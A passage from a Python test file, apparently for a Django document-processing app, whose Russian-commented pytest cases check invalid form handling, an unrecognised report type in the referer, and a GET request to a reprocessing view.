        """Тест покрывает строки 44-45: невалидная форма"""
        client.login(username='testuser', password='testpass123')

        response = client.post(
            reverse('deconstructor'),
            {'acts': 'true'}
        )

        assert response.status_code == 200
        assert 'form' in response.context

    def test_doc_reprocess_invalid_report_type_referer(self, client, test_user, test_act):
        """Тест покрывает строку 301: неверный тип отчета в doc_reprocess через реферер"""
        client.login(username='testuser', password='testpass123')

        # Тестируем случай, когда в реферере нет ни act, ни scientific, ни tech
        response = client.post(
            reverse('doc_reprocess', kwargs={'pk': test_act.id}),
            {'select_text': 'on'},
            HTTP_REFERER='http://testserver/unknown_type/1/'
        )

        assert response.status_code == 404
        assert "Некорректный тип отчёта" in response.content.decode()

    def test_doc_reprocess_get_method(self, client, test_user, test_act):
        """Тест покрывает строку 309: GET-запрос к doc_reprocess"""
        client.login(username='testuser', password='testpass123')

        response = client.get(
            reverse('doc_reprocess', kwargs={'pk': test_act.id})
        )

        assert response.status_code == 200
        data = json.loads(response.content)
        assert data['response'] == 'invalid method'
